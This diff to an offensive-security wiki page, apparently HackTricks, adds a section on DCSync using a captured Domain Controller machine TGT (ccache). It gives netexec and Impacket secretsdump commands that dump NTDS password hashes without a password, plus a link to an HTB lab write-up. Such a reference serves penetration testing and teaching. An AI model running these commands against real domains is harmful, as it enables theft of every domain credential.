@@ -35,6 +35,24 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
 
+### DCSync using a captured DC machine TGT (ccache)
+
+In unconstrained-delegation export-mode scenarios, you may capture a Domain Controller machine TGT (e.g., `DC1$@DOMAIN` for `krbtgt@DOMAIN`). You can then use that ccache to authenticate as the DC and perform DCSync without a password.
+
+```bash
+# Generate a krb5.conf for the realm (helper)
+netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
+sudo tee /etc/krb5.conf < krb5.conf
+
+# netexec helper using KRB5CCNAME
+KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
+  netexec smb <DC_FQDN> --use-kcache --ntds
+
+# Or Impacket with Kerberos from ccache
+KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
+  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
+```
+
 `-just-dc` generates 3 files:
 
 - one with the **NTLM hashes**
@@ -70,8 +88,6 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
+- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
